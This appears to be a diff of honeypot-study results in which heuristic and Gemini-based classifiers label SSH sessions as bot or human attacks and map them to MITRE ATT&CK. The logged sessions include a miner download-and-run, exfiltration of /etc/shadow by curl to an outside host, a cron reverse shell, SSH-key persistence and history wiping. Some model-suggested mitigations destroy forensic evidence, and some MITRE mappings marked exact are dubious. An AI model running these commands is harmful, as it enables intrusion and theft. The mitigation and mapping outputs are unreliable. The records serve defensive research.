+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.08,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -718,13 +1293,26 @@
     "ordem": 16,
     "session_id": "bot_16_3a9d4062f118",
     "src_ip": "179.43.176.50",
+    "duracao_segundos": 1.0,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -a"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.1,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -749,6 +1337,29 @@
         "uname -a"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento básico (uname -a) típico de varredura ou verificação inicial de sistema por bot.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 179.43.176.50 -j DROP"
+      ],
+      "session_id": "bot_16_3a9d4062f118",
+      "src_ip": "179.43.176.50",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.08,
+      "comandos": [
+        "uname -a"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -764,13 +1375,26 @@
     "ordem": 17,
     "session_id": "bot_17_8e1f7029a405",
     "src_ip": "185.220.101.7",
+    "duracao_segundos": 0.9,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.09,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -795,6 +1419,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento (uname) para identificação do sistema operacional por um IP de origem associado a serviços de anonimização.",
+      "mitre_attack": [
+        {
+          "tactic": "Reconhecimento",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 185.220.101.7 -j DROP"
+      ],
+      "session_id": "bot_17_8e1f7029a405",
+      "src_ip": "185.220.101.7",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.03,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -810,16 +1457,38 @@
     "ordem": 18,
     "session_id": "bot_18_e19b44028c33",
     "src_ip": "92.118.39.62",
+    "duracao_segundos": 0.8,
+    "pausas_segundos": [
+      0,
+      0,
+      0,
+      1
+    ],
     "comandos": [
       "cd /var/tmp",
       "wget -q http://92.118.39.62/xmrig",
       "chmod +x xmrig",
       "./xmrig"
     ],
+    "comandos_com_tempo": [
+      "[1] cd /var/tmp (+0s)",
+      "[2] wget -q http://92.118.39.62/xmrig (+0s)",
+      "[3] chmod +x xmrig (+0s)",
+      "[4] ./xmrig (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /var/tmp",
+      "[2] wget -q http://92.118.39.62/xmrig",
+      "[3] chmod +x xmrig",
+      "[4] ./xmrig"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.42,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -855,6 +1524,46 @@
         "./xmrig"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O atacante realizou o download direto e execução de um minerador de criptomoedas (XMRig) na pasta /var/tmp de forma totalmente automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./xmrig"
+        },
+        {
+          "tactic": "Impact",
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "evidence": "wget -q http://92.118.39.62/xmrig && chmod +x xmrig && ./xmrig"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://92.118.39.62/xmrig"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 92.118.39.62 -j DROP",
+        "pkill -f xmrig",
+        "rm -f /var/tmp/xmrig"
+      ],
+      "session_id": "bot_18_e19b44028c33",
+      "src_ip": "92.118.39.62",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.28,
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.62/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -870,13 +1579,26 @@
     "ordem": 19,
     "session_id": "bot_19_5c7a3084b912",
     "src_ip": "195.54.160.149",
+    "duracao_segundos": 1.0,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.07,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -901,6 +1623,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento de sistema operacional e arquitetura, típico de scanners automatizados ou scripts de sondagem inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 195.54.160.149 -j DROP"
+      ],
+      "session_id": "bot_19_5c7a3084b912",
+      "src_ip": "195.54.160.149",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.04,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -916,6 +1661,15 @@
     "ordem": 20,
     "session_id": "bot_20_f91d83b42a11",
     "src_ip": "198.51.100.200",
+    "duracao_segundos": 18.0,
+    "pausas_segundos": [
+      1,
+      2,
+      3,
+      4,
+      4,
+      4
+    ],
     "comandos": [
       "id",
       "uname -a",
@@ -924,10 +1678,29 @@
       "cat /proc/cpuinfo",
       "crontab -l"
     ],
+    "comandos_com_tempo": [
+      "[1] id (+1s)",
+      "[2] uname -a (+2s)",
+      "[3] cat /etc/issue (+3s)",
+      "[4] ls -la /tmp (+4s)",
+      "[5] cat /proc/cpuinfo (+4s)",
+      "[6] crontab -l (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -a",
+      "[3] cat /etc/issue",
+      "[4] ls -la /tmp",
+      "[5] cat /proc/cpuinfo",
+      "[6] crontab -l"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.45,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -977,6 +1750,48 @@
         "crontab -l"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O ator executou comandos manuais de reconhecimento inicial do sistema operacional, listagem de diretórios temporários e verificação de tarefas agendadas (crontab), indicando exploração interativa.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a, cat /etc/issue, cat /proc/cpuinfo"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /tmp"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.200 -j DROP",
+        "passwd -l root",
+        "history -c"
+      ],
+      "session_id": "bot_20_f91d83b42a11",
+      "src_ip": "198.51.100.200",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.42,
+      "comandos": [
+        "id",
+        "uname -a",
+        "cat /etc/issue",
+        "ls -la /tmp",
+        "cat /proc/cpuinfo",
+        "crontab -l"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -992,6 +1807,15 @@
     "ordem": 21,
     "session_id": "hum_01_dd2a67985225",
     "src_ip": "198.51.100.25",
+    "duracao_segundos": 29.0,
+    "pausas_segundos": [
+      1,
+      3,
+      6,
+      3,
+      6,
+      6
+    ],
     "comandos": [
       "ls",
       "mkdir teste123",
@@ -1000,10 +1824,29 @@
       "cd usr/",
       "exit"
     ],
+    "comandos_com_tempo": [
+      "[1] ls (+1s)",
+      "[2] mkdir teste123 (+3s)",
+      "[3] cd .. (+6s)",
+      "[4] ls (+3s)",
+      "[5] cd usr/ (+6s)",
+      "[6] exit (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls",
+      "[2] mkdir teste123",
+      "[3] cd ..",
+      "[4] ls",
+      "[5] cd usr/",
+      "[6] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.05,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1033,6 +1876,41 @@
         "exit"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "BAIXO",
+      "summary": "O invasor realizou navegação manual no sistema de arquivos utilizando comandos básicos de reconhecimento e manipulação de diretórios, indicando exploração interativa.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "Uso repetido do comando 'ls' para listar arquivos e diretórios."
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "Navegação manual pelos diretórios do sistema com 'cd' e 'mkdir'."
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "iptables -A INPUT -s 198.51.100.25 -j DROP"
+      ],
+      "session_id": "hum_01_dd2a67985225",
+      "src_ip": "198.51.100.25",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.43,
+      "comandos": [
+        "ls",
+        "mkdir teste123",
+        "cd ..",
+        "ls",
+        "cd usr/",
+        "exit"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1048,15 +1926,34 @@
     "ordem": 22,
     "session_id": "hum_02_01b6a903bd25",
     "src_ip": "198.51.100.25",
+    "duracao_segundos": 221.4,
+    "pausas_segundos": [
+      7,
+      13,
+      9
+    ],
     "comandos": [
       "ls -a",
       "cd .bashrc",
       "ipconfig"
     ],
+    "comandos_com_tempo": [
+      "[1] ls -a (+7s)",
+      "[2] cd .bashrc (+13s)",
+      "[3] ipconfig (+9s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls -a",
+      "[2] cd .bashrc",
+      "[3] ipconfig"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.05,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1083,6 +1980,38 @@
         "ipconfig"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor realizou navegação manual exploratória listando arquivos ocultos, tentando acessar um arquivo como diretório e executando comando incorreto para o sistema operacional (ipconfig no Linux), indicando erro humano típico de digitação e reconhecimento.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -a"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "ipconfig"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.25 -j DROP",
+        "fail2ban-client set sshd banip 198.51.100.25"
+      ],
+      "session_id": "hum_02_01b6a903bd25",
+      "src_ip": "198.51.100.25",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.22,
+      "comandos": [
+        "ls -a",
+        "cd .bashrc",
+        "ipconfig"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1098,6 +2027,18 @@
     "ordem": 23,
     "session_id": "hum_03_350bf1bd00da",
     "src_ip": "198.51.100.44",
+    "duracao_segundos": 50.0,
+    "pausas_segundos": [
+      14,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4
+    ],
     "comandos": [
       "whoami",
       "uname -a",
@@ -1109,10 +2050,35 @@
       "history -c",
       "exit"
     ],
+    "comandos_com_tempo": [
+      "[1] whoami (+14s)",
+      "[2] uname -a (+4s)",
+      "[3] ls -la (+4s)",
+      "[4] cat /etc/passwd | grep sh (+4s)",
+      "[5] cat /etc/shadow (+4s)",
+      "[6] find / -perm -4000 2>/dev/null (+4s)",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys (+4s)",
+      "[8] history -c (+4s)",
+      "[9] exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] uname -a",
+      "[3] ls -la",
+      "[4] cat /etc/passwd | grep sh",
+      "[5] cat /etc/shadow",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+      "[8] history -c",
+      "[9] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.98,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1177,6 +2143,64 @@
         "exit"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento interativo do sistema (whoami, uname, listagem de diretórios), verificou usuários e hashes de senha, buscou binários com SUID, estabeleceu persistência adicionando uma chave SSH autorizada e limpou o histórico antes de sair.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.008",
+          "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+          "evidence": "cat /etc/passwd | grep sh && cat /etc/shadow"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        },
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1098.004",
+          "technique_name": "Account Manipulation: SSH Authorized Keys",
+          "evidence": "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.44 -j DROP",
+        "rm -f ~/.ssh/authorized_keys",
+        "passwd -l root",
+        "history -c && history -w"
+      ],
+      "session_id": "hum_03_350bf1bd00da",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.79,
+      "comandos": [
+        "whoami",
+        "uname -a",
+        "ls -la",
+        "cat /etc/passwd | grep sh",
+        "cat /etc/shadow",
+        "find / -perm -4000 2>/dev/null",
+        "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+        "history -c",
+        "exit"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1192,6 +2216,18 @@
     "ordem": 24,
     "session_id": "hum_04_210b67150fee",
     "src_ip": "198.51.100.44",
+    "duracao_segundos": 38.0,
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      4,
+      5,
+      5,
+      5,
+      3
+    ],
     "comandos": [
       "id",
       "pwd",
@@ -1203,10 +2239,35 @@
       "rm -f /tmp/backup_dump.tar.gz && history -c",
       "exit"
     ],
+    "comandos_com_tempo": [
+      "[1] id (+3s)",
+      "[2] pwd (+3s)",
+      "[3] ls -la /var/www (+3s)",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null (+4s)",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache' (+4s)",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow (+5s)",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload (+5s)",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c (+5s)",
+      "[9] exit (+3s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] pwd",
+      "[3] ls -la /var/www",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache'",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c",
+      "[9] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.85,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1261,6 +2322,64 @@
         "exit"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento manual do sistema, buscou arquivos de configuração sensíveis contendo credenciais, tentou arquivar arquivos críticos do sistema (/etc/passwd e /etc/shadow) e exfiltrá-los via HTTP para um servidor externo, finalizando com limpeza de rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /var/www e find / -name '*.env' -o -name 'wp-config.php'"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1057",
+          "technique_name": "Process Discovery",
+          "evidence": "ps aux | grep -E 'mysql|postgres|nginx|apache'"
+        },
+        {
+          "tactic": "Collection",
+          "technique_id": "T1005",
+          "technique_name": "Data from Local System",
+          "evidence": "tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow"
+        },
+        {
+          "tactic": "Exfiltration",
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "evidence": "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "rm -f /tmp/backup_dump.tar.gz && history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.44 -j DROP",
+        "passwd -l admin",
+        "shred -u /tmp/backup_dump.tar.gz",
+        "history -c && truncate -s 0 ~/.bash_history"
+      ],
+      "session_id": "hum_04_210b67150fee",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.85,
+      "comandos": [
+        "id",
+        "pwd",
+        "ls -la /var/www",
+        "find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null",
+        "ps aux | grep -E 'mysql|postgres|nginx|apache'",
+        "tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow",
+        "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
+        "rm -f /tmp/backup_dump.tar.gz && history -c",
+        "exit"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -1276,6 +2395,16 @@
     "ordem": 25,
     "session_id": "hum_05_daac67c03d17",
     "src_ip": "198.51.100.44",
+    "duracao_segundos": 30.0,
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      5,
+      5,
+      4
+    ],
     "comandos": [
       "whoami && hostname",
       "ip a",
@@ -1285,10 +2414,31 @@
       "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
       "unset HISTFILE && exit"
     ],
+    "comandos_com_tempo": [
+      "[1] whoami && hostname (+3s)",
+      "[2] ip a (+3s)",
+      "[3] netstat -tulpn (+3s)",
+      "[4] cat ~/.ssh/id_rsa (+4s)",
+      "[5] crontab -l (+5s)",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab (+5s)",
+      "[7] unset HISTFILE && exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami && hostname",
+      "[2] ip a",
+      "[3] netstat -tulpn",
+      "[4] cat ~/.ssh/id_rsa",
+      "[5] crontab -l",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
+      "[7] unset HISTFILE && exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "retido_no_filtro_l1": false,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_llm_direto": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_llm_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.9,
     "resposta_crua_llm": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1352,6 +2502,68 @@
         "unset HISTFILE && exit"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento inicial do sistema, leu chaves SSH privadas, verificou tarefas agendadas e estabeleceu persistência via crontab com um reverse shell, limpando o histórico de comandos ao finalizar.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami && hostname"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "ip a"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "netstat -tulpn"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1552.004",
+          "technique_name": "Unsecured Credentials: Private Keys",
+          "evidence": "cat ~/.ssh/id_rsa"
+        },
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1053.003",
+          "technique_name": "Scheduled Task/Job: Cron",
+          "evidence": "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "unset HISTFILE && exit"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.44 -j DROP",
+        "sed -i '/203.0.113.55/d' /etc/crontab",
+        "rm -f ~/.ssh/id_rsa",
+        "passwd -l root"
+      ],
+      "session_id": "hum_05_daac67c03d17",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.89,
+      "comandos": [
